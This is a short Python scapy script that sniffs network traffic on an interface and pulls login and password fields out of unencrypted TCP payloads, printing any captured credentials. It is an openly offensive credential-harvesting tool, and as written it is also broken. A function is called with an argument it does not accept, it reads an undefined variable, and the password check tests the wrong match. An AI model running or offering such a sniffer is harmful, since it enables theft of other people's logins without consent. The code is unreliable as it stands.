from scapy.all import *
from urllib import parse
import re

# your internet inerface connection
iface = "eth0"


def get_login_pass():
    user = None
    passwd = None
    # enter your password and username lists
    userfeilds = ["login", "admin"]
    passfields = ["password", "admin"]

    for login in userfeilds:
        login_re = re.search("(%s=[^&]+)" % login, body, re.IGNORECASE)
        if login_re:
            user = login_re.group()
    for passfield in passfields:
        pass_re = re.search("(%s=[^&]+)" % passfield, body, re.IGNORECASE)
        if login_re:
            passwd = pass_re.group()
    if user and passwd:
        return (user, passwd)


def pkt_parser(packet):
    if packet.haslayer(TCP) and packet.haslayer(Raw) and packet.haslayer(IP):
        body = str(packet[TCP].payload)

        # get_login_pass(body)
        user_pass = get_login_pass(body)
        if user_pass != None:
            print(packet[TCP].payload)
            print(parse.unquote(user_pass[0]))
            print(parse.unquote(user_pass[1]))

    else:
        pass


try:
    sniff(iface=iface, prn=pkt_parser, store=0)

except KeyboardInterrupt:
    print("Exiting...")
    exit(0)
